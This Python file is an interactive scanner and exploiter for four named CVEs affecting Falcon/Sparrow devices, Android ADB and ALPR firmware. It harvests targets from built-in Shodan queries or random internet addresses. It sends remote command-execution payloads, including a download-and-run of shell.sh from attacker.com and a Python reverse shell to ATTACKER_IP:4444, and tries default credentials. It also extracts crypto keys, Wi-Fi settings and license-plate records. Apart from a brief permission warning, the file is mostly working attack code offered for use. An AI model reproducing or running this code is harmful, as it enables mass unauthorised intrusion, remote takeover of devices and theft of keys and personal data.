#!/usr/bin/env python3
"""
CVE-2025 Scanner & Exploiter
Interactive tool for scanning AND exploiting:
- CVE-2025-59403: Unauthenticated admin API / ADB RCE (9.8)
- CVE-2025-59407: Hardcoded keystore crypto key (CRITICAL)
- CVE-2025-47818: Hardcoded fallback hotspot credentials
- CVE-2025-47823: Hardcoded system password on ALPR firmware
"""

import socket
import ssl
import json
import time
import sys
import os
import re
import hashlib
import base64
import threading
import queue
import subprocess
import telnetlib
from datetime import datetime
from urllib.parse import urlparse, urljoin
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import argparse
import csv
import random

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    END = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    BLINK = '\033[5m'

# Shodan queries built-in
SHODAN_QUERIES = {
    'CVE-2025-59403': [
        'title:"Falcon"',
        'title:"Sparrow"',
        '"/api/v1/admin"',
        '"/api/v1/system"',
        '"/api/v1/debug"',
        'port:5555 "Android"',
        '"Android Debug Bridge"',
        'port:5037 adb',
        'http.title:"ADB"',
        '"Falcon" "api" port:443',
        '"Sparrow" "api" port:443',
        '"/api/v1/execute"',
        '"/api/v1/command"'
    ],
    'CVE-2025-59407': [
        '"Android" "v6.35.33"',
        '"keystore" "hardcoded"',
        '"crypto" "key" "Android"',
        '"/api/v1/keystore"',
        '"/api/v1/security"',
        '"hardcoded_key"',
        '"default_key"'
    ],
    'CVE-2025-47818': [
        '"hotspot" "fallback"',
        '"/api/v1/hotspot"',
        '"default" "hotspot" "credentials"',
        '"/api/v1/wifi"',
        '"hotspot" "config"',
        '"wifi" "credentials"'
    ],
    'CVE-2025-47823': [
        '"ALPR" "v2.0"',
        '"ALPR" "v2.1"',
        '"ALPR" "v2.2"',
        '"/api/v1/alpr"',
        '"license plate" "system"',
        '"LPR" "firmware"',
        '"ALPR" "firmware"',
        '"/alpr" "/api"'
    ]
}

class CVEExploiter:
    def __init__(self, verbose=False, output_file=None, threads=10, timeout=5, exploit=False):
        self.verbose = verbose
        self.output_file = output_file
        self.threads = threads
        self.timeout = timeout
        self.exploit = exploit
        self.results = []
        self.lock = threading.Lock()
        self.work_queue = queue.Queue()
        self.total_scanned = 0
        self.vulnerable_found = 0
        self.exploited = 0
        self.shodan_api_key = None
        
        self.payloads = {
            'CVE-2025-59403': {
                'command_exec': [
                    'id',
                    'whoami',
                    'uname -a',
                    'cat /etc/passwd',
                    'ls -la /',
                    'ps aux',
                    'netstat -tulpn',
                    'ifconfig',
                    'echo "VULNERABLE" > /tmp/test.txt',
                    'wget -O /tmp/backdoor.sh http://attacker.com/shell.sh && chmod +x /tmp/backdoor.sh && /tmp/backdoor.sh',
                    'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\''
                ],
                'adb_commands': [
                    'shell id',
                    'shell whoami',
                    'shell getprop',
                    'shell pm list packages',
                    'shell dumpsys battery',
                    'shell input keyevent 26',
                    'shell settings put global adb_enabled 1',
                    'shell settings put secure install_non_market_apps 1'
                ]
            },
            'CVE-2025-59407': {
                'crypto_keys': [
                    'MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA',
                    'LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQ==',
                    '-----BEGIN PRIVATE KEY-----',
                    'hardcoded_keystore_password',
                    'android_keystore_key_2024',
                    'default_crypto_key_v6.35.33'
                ]
            }
        }

    def print_banner(self):
        banner = f"""
{Colors.RED}================================================================================
                                                                           
    {Colors.YELLOW}███████╗██╗   ██╗███████╗    ███████╗ ██████╗ █████╗ ███╗   ██╗██████╗ ███████╗██████╗{Colors.RED}    
    {Colors.YELLOW}██═════╝██║   ██║██╔════╝    ██╔════╝██╔════╝██╔══██╗████╗  ██║██╔══██╗██╔════╝██╔══██╗{Colors.RED}   
    {Colors.YELLOW}██      ██║   ██║█████╗      ███████╗██║     ███████║██╔██╗ ██║██████╔╝█████╗  ██████╔╝{Colors.RED}   
    {Colors.YELLOW}██      ╚██╗ ██╔╝██╔══╝      ╚════██║██║     ██╔══██║██║╚██╗██║██╔══██╗██╔══╝  ███║  ██║{Colors.RED}   
    {Colors.YELLOW}███████╗ ╚████╔╝ ███████╗    ███████║╚██████╗██║  ██║██║ ╚████║██║  ██║███████╗██║  ██║{Colors.RED}   
    {Colors.YELLOW}╚══════╝  ╚═══╝  ╚══════╝    ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝{Colors.RED}   
                                                                           
    {Colors.CYAN}███████╗██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗███████╗██████╗ {Colors.RED}           
    {Colors.CYAN}██╔════╝╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝██╔════╝██╔══██╗{Colors.RED}          
    {Colors.CYAN}█████╗   ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║   █████╗  ██████╔╝{Colors.RED}          
    {Colors.CYAN}██╔══╝   ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║   ██╔══╝  ██╔══██╗{Colors.RED}          
    {Colors.CYAN}███████╗██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║   ███████╗██║  ██║{Colors.RED}          
    {Colors.CYAN}╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝{Colors.RED}          
                                                                           
================================================================================{Colors.END}

{Colors.RED}{Colors.BLINK}WARNING: EXPLOITATION MODULE INCLUDED{Colors.END}
{Colors.YELLOW}Use only on systems you own or have explicit permission to test{Colors.END}

{Colors.BOLD}Vulnerabilities:{Colors.END}
  {Colors.RED}CVE-2025-59403 - Unauthenticated admin API / ADB RCE (Score: 9.8){Colors.END}
  {Colors.RED}CVE-2025-59407 - Hardcoded keystore crypto key (CRITICAL){Colors.END}
  {Colors.YELLOW}CVE-2025-47818 - Hardcoded fallback hotspot credentials{Colors.END}
  {Colors.YELLOW}CVE-2025-47823 - Hardcoded system password on ALPR firmware <=2.2{Colors.END}

{Colors.BOLD}Mode:{Colors.END} {'SCAN + EXPLOIT' if self.exploit else 'SCAN ONLY'}
{Colors.BOLD}Threads:{Colors.END} {self.threads}
{Colors.BOLD}Timeout:{Colors.END} {self.timeout}s
"""
        print(banner)

    def get_shodan_targets(self, api_key):
        """Get targets from Shodan using built-in queries"""
        targets = []
        try:
            import shodan
            api = shodan.Shodan(api_key)
            
            print(f"{Colors.CYAN}Searching Shodan for CVE-2025 vulnerable systems...{Colors.END}")
            
            for cve, queries in SHODAN_QUERIES.items():
                query = " OR ".join(queries[:3])
                print(f"{Colors.CYAN}Searching {cve}...{Colors.END}")
                try:
                    results = api.search(query, limit=50)
                    for result in results['matches']:
                        targets.append(result['ip_str'])
                    print(f"{Colors.GREEN}Found {len(results['matches'])} targets for {cve}{Colors.END}")
                except Exception as e:
                    if self.verbose:
                        print(f"{Colors.YELLOW}Warning for {cve}: {e}{Colors.END}")
            
            if not targets:
                fallback_queries = [
                    '"/api/v1/admin" port:443',
                    '"/api/v1/system" port:443',
                    '"Falcon" "api" port:443',
                    '"Sparrow" "api" port:443',
                    'port:5555 "Android"',
                    '"/api/v1/alpr"'
                ]
                
                print(f"{Colors.YELLOW}Trying fallback queries...{Colors.END}")
                for query in fallback_queries:
                    try:
                        results = api.search(query, limit=30)
                        for result in results['matches']:
                            targets.append(result['ip_str'])
                    except:
                        continue
            
            targets = list(set(targets))
            
        except ImportError:
            print(f"{Colors.RED}Shodan library not installed. Run: pip install shodan{Colors.END}")
        except Exception as e:
            print(f"{Colors.RED}Shodan error: {e}{Colors.END}")
            
        return targets

    def exploit_cve_59403(self, target, path, payload):
        results = []
        
        if 'adb' in str(payload).lower():
            for cmd in self.payloads['CVE-2025-59403']['adb_commands']:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(self.timeout)
                    sock.connect((target, 5555))
                    sock.send(f"{cmd}\n".encode())
                    response = sock.recv(4096).decode()
                    sock.close()
                    
                    results.append({
                        'cve': 'CVE-2025-59403',
                        'target': target,
                        'method': 'ADB',
                        'command': cmd,
                        'output': response[:500],
                        'exploited': True
                    })
                    
                    if self.verbose:
                        print(f"{Colors.GREEN}ADB Exploit Success on {target}: {cmd}{Colors.END}")
                        print(f"Output: {response[:200]}...")
                except Exception as e:
                    if self.verbose:
                        print(f"{Colors.YELLOW}ADB exploit failed on {target}: {e}{Colors.END}")
        else:
            for cmd in self.payloads['CVE-2025-59403']['command_exec']:
                if 'ATTACKER_IP' in cmd:
                    attacker_ip = input(f"{Colors.CYAN}Enter your listener IP for reverse shell: {Colors.END}")
                    cmd = cmd.replace('ATTACKER_IP', attacker_ip)
                
                exploit_payload = {
                    'command': cmd,
                    'cmd': cmd,
                    'action': 'exec',
                    'execute': cmd,
                    'payload': cmd
                }
                
                url = f"http://{target}{path}"
                try:
                    response = requests.post(url, json=exploit_payload, timeout=self.timeout, verify=False)
                    
                    if response.status_code == 200:
                        results.append({
                            'cve': 'CVE-2025-59403',
                            'target': target,
                            'path': path,
                            'command': cmd,
                            'response': response.text[:500],
                            'exploited': True
                        })
                        
                        if self.verbose:
                            print(f"{Colors.GREEN}API Exploit Success on {target}: {cmd}{Colors.END}")
                            if 'root' in response.text or 'uid=' in response.text:
                                print(f"{Colors.RED}ROOT ACCESS GAINED{Colors.END}")
                except Exception as e:
                    if self.verbose:
                        print(f"{Colors.YELLOW}API exploit failed: {e}{Colors.END}")
        
        return results

    def exploit_cve_59407(self, target, path, response_text):
        results = []
        
        for pattern in self.payloads['CVE-2025-59407']['crypto_keys']:
            if pattern in response_text:
                key_pattern = re.compile(f'{pattern}[A-Za-z0-9+/=]+')
                keys = key_pattern.findall(response_text)
                for key in keys:
                    results.append({
                        'cve': 'CVE-2025-59407',
                        'target': target,
                        'path': path,
                        'key_found': key[:100] + '...' if len(key) > 100 else key,
                        'full_key': key,
                        'exploited': True
                    })
                    
                    if self.verbose:
                        print(f"{Colors.GREEN}Crypto key extracted from {target}{Colors.END}")
                        print(f"Key: {key[:50]}...")
        
        return results

    def exploit_cve_47818(self, target, path, credentials):
        results = []
        
        username, password = credentials.split(':')
        url = f"http://{target}{path}"
        
        try:
            response = requests.get(url, auth=(username, password), timeout=self.timeout, verify=False)
            
            if response.status_code == 200:
                config_endpoints = ['/config', '/settings', '/wifi', '/network', '/status']
                for endpoint in config_endpoints:
                    try:
                        config_url = f"http://{target}{endpoint}"
                        config_resp = requests.get(config_url, auth=(username, password), timeout=self.timeout, verify=False)
                        if config_resp.status_code == 200:
                            results.append({
                                'cve': 'CVE-2025-47818',
                                'target': target,
                                'path': endpoint,
                                'credentials': credentials,
                                'config_data': config_resp.text[:500],
                                'exploited': True
                            })
                            if self.verbose:
                                print(f"{Colors.GREEN}Hotspot config accessed on {target}{Colors.END}")
                    except:
                        pass
        except:
            pass
        
        return results

    def exploit_cve_47823(self, target, path, credentials):
        results = []
        
        username, password = credentials.split(':')
        url = f"http://{target}{path}"
        
        try:
            response = requests.get(url, auth=(username, password), timeout=self.timeout, verify=False)
            
            if response.status_code == 200:
                alpr_endpoints = ['/vehicles', '/plates', '/camera', '/captures', '/database']
                for endpoint in alpr_endpoints:
                    try:
                        alpr_url = f"http://{target}{endpoint}"
                        alpr_resp = requests.get(alpr_url, auth=(username, password), timeout=self.timeout, verify=False)
                        if alpr_resp.status_code == 200:
                            results.append({
                                'cve': 'CVE-2025-47823',
                                'target': target,
                                'path': endpoint,
                                'credentials': credentials,
                                'alpr_data': alpr_resp.text[:500],
                                'exploited': True
                            })
                            if self.verbose:
                                print(f"{Colors.GREEN}ALPR data accessed on {target}{Colors.END}")
                    except:
                        pass
        except:
            pass
        
        return results

    def scan_and_exploit(self, target):
        results = []
        
        for path in ['/api/v1/admin/execute', '/api/v1/admin/command', '/api/v1/system/exec']:
            for payload in [{"cmd": "id"}, {"command": "whoami"}]:
                try:
                    url = f"http://{target}{path}"
                    response = requests.post(url, json=payload, timeout=self.timeout, verify=False)
                    
                    if response.status_code == 200 and any(i in response.text.lower() for i in ['uid=', 'root', 'executed']):
                        if self.exploit:
                            exploit_results = self.exploit_cve_59403(target, path, payload)
                            results.extend(exploit_results)
                            with self.lock:
                                self.exploited += len(exploit_results)
                        else:
                            results.append({
                                'cve': 'CVE-2025-59403',
                                'target': target,
                                'path': path,
                                'vulnerable': True,
                                'exploited': False
                            })
                except:
                    pass
        
        for path in ['/api/v1/crypto/key', '/api/v1/keystore']:
            try:
                url = f"http://{target}{path}"
                response = requests.get(url, timeout=self.timeout, verify=False)
                
                if response.status_code == 200:
                    for pattern in self.payloads['CVE-2025-59407']['crypto_keys']:
                        if pattern in response.text:
                            if self.exploit:
                                exploit_results = self.exploit_cve_59407(target, path, response.text)
                                results.extend(exploit_results)
                                with self.lock:
                                    self.exploited += len(exploit_results)
                            else:
                                results.append({
                                    'cve': 'CVE-2025-59407',
                                    'target': target,
                                    'path': path,
                                    'vulnerable': True,
                                    'exploited': False
                                })
                            break
            except:
                pass
        
        for cred in [('admin', 'admin'), ('root', 'root'), ('admin', 'password')]:
            for path in ['/api/v1/hotspot/config', '/api/v1/wifi/credentials']:
                try:
                    url = f"http://{target}{path}"
                    response = requests.get(url, auth=cred, timeout=self.timeout, verify=False)
                    
                    if response.status_code == 200:
                        if self.exploit:
                            exploit_results = self.exploit_cve_47818(target, path, f"{cred[0]}:{cred[1]}")
                            results.extend(exploit_results)
                            with self.lock:
                                self.exploited += len(exploit_results)
                        else:
                            results.append({
                                'cve': 'CVE-2025-47818',
                                'target': target,
                                'path': path,
                                'credentials': f"{cred[0]}:{cred[1]}",
                                'vulnerable': True,
                                'exploited': False
                            })
                        break
                except:
                    pass
        
        return results

    def worker(self):
        while not self.work_queue.empty():
            target = self.work_queue.get()
            try:
                results = self.scan_and_exploit(target)
                
                if results:
                    with self.lock:
                        self.results.extend(results)
                        self.vulnerable_found += sum(1 for r in results if r.get('vulnerable', False))
                        
                        for result in results:
                            if result.get('exploited', False):
                                self.print_exploit_result(result)
                            elif result.get('vulnerable', False):
                                self.print_vulnerability(result)
                
                self.total_scanned += 1
                
                if self.total_scanned % 5 == 0:
                    os.system('clear' if os.name == 'posix' else 'cls')
                    self.print_banner()
                    self.print_scanning_status()
                    
            except Exception as e:
                if self.verbose:
                    print(f"{Colors.RED}Error scanning {target}: {e}{Colors.END}")
            finally:
                self.work_queue.task_done()

    def print_scanning_status(self):
        status = f"""
{Colors.CYAN}-------------------------------------------------------------
{Colors.BOLD}SCAN STATUS{Colors.END}
-------------------------------------------------------------
Total Targets : {self.total_scanned}
Vulnerable     : {self.vulnerable_found}
Exploited      : {self.exploited}
Queue Size     : {self.work_queue.qsize()}
Elapsed Time   : {datetime.now().strftime('%H:%M:%S')}
-------------------------------------------------------------
{Colors.END}"""
        return status

    def print_exploit_result(self, result):
        cve = result.get('cve', 'Unknown')
        target = result.get('target', 'Unknown')
        
        print(f"""
{Colors.RED}{Colors.BLINK}EXPLOIT SUCCESSFUL{Colors.END}
{Colors.CYAN}-------------------------------------------------------------
CVE: {cve}
Target: {target}
Method: {result.get('method', 'API')}
Command: {result.get('command', 'N/A')[:30]}
Output: {str(result.get('output', ''))[:40]}
-------------------------------------------------------------
{Colors.END}""")

    def print_vulnerability(self, result):
        cve = result.get('cve', 'Unknown')
        target = result.get('target', 'Unknown')
        
        colors = {
            'CVE-2025-59403': Colors.RED,
            'CVE-2025-59407': Colors.RED,
            'CVE-2025-47818': Colors.YELLOW,
            'CVE-2025-47823': Colors.YELLOW
        }
        color = colors.get(cve, Colors.END)
        
        print(f"""
{color}-------------------------------------------------------------
VULNERABILITY FOUND
-------------------------------------------------------------
CVE: {cve}
Target: {target}
Path: {result.get('path', 'N/A')}
Credentials: {result.get('credentials', 'N/A')}
-------------------------------------------------------------
{Colors.END}""")

    def scan_network(self, targets):
        if not targets:
            print(f"{Colors.RED}No targets to scan{Colors.END}")
            return
            
        for target in targets:
            self.work_queue.put(target.strip())
            
        print(f"{Colors.GREEN}Starting {'exploitation' if self.exploit else 'scanning'} with {self.threads} threads{Colors.END}")
        print(f"{Colors.YELLOW}Press Ctrl+C to stop{Colors.END}")
        
        threads = []
        for _ in range(self.threads):
            thread = threading.Thread(target=self.worker)
            thread.start()
            threads.append(thread)
            
        try:
            for thread in threads:
                thread.join()
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}Stopping...{Colors.END}")
            
        self.print_summary()

    def print_summary(self):
        os.system('clear' if os.name == 'posix' else 'cls')
        self.print_banner()
        
        print(f"""
{Colors.CYAN}-------------------------------------------------------------
{Colors.BOLD}SCAN COMPLETE{Colors.END}
-------------------------------------------------------------
Total Scanned : {self.total_scanned}
Vulnerable    : {self.vulnerable_found}
Exploited     : {self.exploited}
-------------------------------------------------------------
{Colors.BOLD}Results by CVE{Colors.END}
-------------------------------------------------------------
{Colors.END}""")
        
        grouped = {}
        for result in self.results:
            cve = result.get('cve', 'Unknown')
            if cve not in grouped:
                grouped[cve] = []
            grouped[cve].append(result)
            
        for cve, results in grouped.items():
            exploited = sum(1 for r in results if r.get('exploited', False))
            vulnerable = sum(1 for r in results if r.get('vulnerable', False))
            
            print(f"""
{Colors.BOLD}{cve}{Colors.END}
  Exploited: {exploited}
  Vulnerable: {vulnerable}
  Examples:""")
            
            for i, result in enumerate(results[:3], 1):
                if result.get('exploited', False):
                    print(f"    {i}. {Colors.RED}{result.get('target', 'N/A')} - EXPLOITED{Colors.END}")
                else:
                    print(f"    {i}. {result.get('target', 'N/A')} - {result.get('path', 'N/A')}")
                
        if self.output_file:
            self.save_results()

    def save_results(self):
        try:
            with open(self.output_file, 'w') as f:
                json.dump(self.results, f, indent=2)
            print(f"\n{Colors.GREEN}Results saved to {self.output_file}{Colors.END}")
        except Exception as e:
            print(f"\n{Colors.RED}Failed to save results: {e}{Colors.END}")

    def generate_targets(self):
        print(f"""
{Colors.CYAN}-------------------------------------------------------------
{Colors.BOLD}SELECT INPUT METHOD{Colors.END}
-------------------------------------------------------------
 1. Single IP
 2. IP Range (CIDR)
 3. From File (IPs list)
 4. Shodan Query (requires Shodan API)
 5. Falcon/Sparrow Signatures
 6. Random Scan
 7. Return
-------------------------------------------------------------
{Colors.END}""")
        
        choice = input(f"{Colors.CYAN}Select option (1-7): {Colors.END}").strip()
        targets = []
        
        if choice == '1':
            ip = input(f"{Colors.CYAN}Enter IP: {Colors.END}").strip()
            if ip:
                targets.append(ip)
                
        elif choice == '2':
            cidr = input(f"{Colors.CYAN}Enter CIDR (e.g., 192.168.1.0/24): {Colors.END}").strip()
            try:
                import ipaddress
                network = ipaddress.ip_network(cidr, strict=False)
                for ip in network.hosts():
                    targets.append(str(ip))
            except Exception as e:
                print(f"{Colors.RED}Invalid CIDR: {e}{Colors.END}")
                
        elif choice == '3':
            filename = input(f"{Colors.CYAN}Enter filename: {Colors.END}").strip()
            try:
                with open(filename, 'r') as f:
                    for line in f:
                        targets.append(line.strip())
            except Exception as e:
                print(f"{Colors.RED}Error reading file: {e}{Colors.END}")
                
        elif choice == '4':
            if not self.shodan_api_key:
                self.shodan_api_key = input(f"{Colors.CYAN}Enter Shodan API key: {Colors.END}").strip()
            
            if self.shodan_api_key:
                targets = self.get_shodan_targets(self.shodan_api_key)
                if targets:
                    print(f"{Colors.GREEN}Found {len(targets)} targets from Shodan{Colors.END}")
                else:
                    print(f"{Colors.YELLOW}No targets found from Shodan{Colors.END}")
            else:
                print(f"{Colors.RED}API key required{Colors.END}")
                
        elif choice == '5':
            print(f"""
{Colors.CYAN}Falcon/Sparrow Signature Patterns{Colors.END}
  - HTTP Title: "Falcon" or "Sparrow"
  - /api/v1/admin/execute
  - /api/v1/system/exec
  - Port 5555 (ADB)
  - /api/v1/debug
""")
            print(f"{Colors.YELLOW}This feature requires Shodan or pre-generated targets{Colors.END}")
            
        elif choice == '6':
            count = int(input(f"{Colors.CYAN}Number of random IPs: {Colors.END}").strip() or "100")
            import random
            for _ in range(count):
                targets.append(f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}")
                
        elif choice == '7':
            return []
            
        return targets

    def run(self):
        self.print_banner()
        
        if self.exploit:
            print(f"{Colors.RED}{Colors.BLINK}WARNING: EXPLOITATION MODE ACTIVE{Colors.END}")
            print(f"{Colors.YELLOW}This will execute commands on vulnerable targets{Colors.END}")
            confirm = input(f"{Colors.RED}Are you sure you want to continue? (yes/no): {Colors.END}")
            if confirm.lower() != 'yes':
                print(f"{Colors.YELLOW}Exiting{Colors.END}")
                return
        
        while True:
            targets = self.generate_targets()
            
            if not targets:
                if input(f"{Colors.CYAN}Exit? (y/n): {Colors.END}").lower() == 'y':
                    break
                continue
                
            print(f"{Colors.GREEN}Found {len(targets)} targets{Colors.END}")
            if len(targets) > 100:
                print(f"{Colors.YELLOW}Large scan detected. Press Ctrl+C to cancel{Colors.END}")
                
            self.scan_network(targets)
            
            if input(f"{Colors.CYAN}Continue? (y/n): {Colors.END}").lower() != 'y':
                break

def main():
    parser = argparse.ArgumentParser(description='CVE-2025 Scanner & Exploiter')
    parser.add_argument('-t', '--target', help='Single target')
    parser.add_argument('-f', '--file', help='File with targets')
    parser.add_argument('-o', '--output', help='Output file (JSON)')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    parser.add_argument('-T', '--threads', type=int, default=10, help='Number of threads')
    parser.add_argument('--timeout', type=int, default=5, help='Connection timeout')
    parser.add_argument('--exploit', action='store_true', help='Enable exploitation')
    parser.add_argument('--cve', help='Scan specific CVE only')
    
    args = parser.parse_args()
    
    scanner = CVEExploiter(
        verbose=args.verbose,
        output_file=args.output,
        threads=args.threads,
        timeout=args.timeout,
        exploit=args.exploit
    )
    
    if args.target:
        targets = [args.target]
        scanner.scan_network(targets)
        if args.output:
            scanner.save_results()
    elif args.file:
        with open(args.file, 'r') as f:
            targets = [line.strip() for line in f]
        scanner.scan_network(targets)
        if args.output:
            scanner.save_results()
    else:
        scanner.run()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}Scan interrupted by user{Colors.END}")
        sys.exit(0)
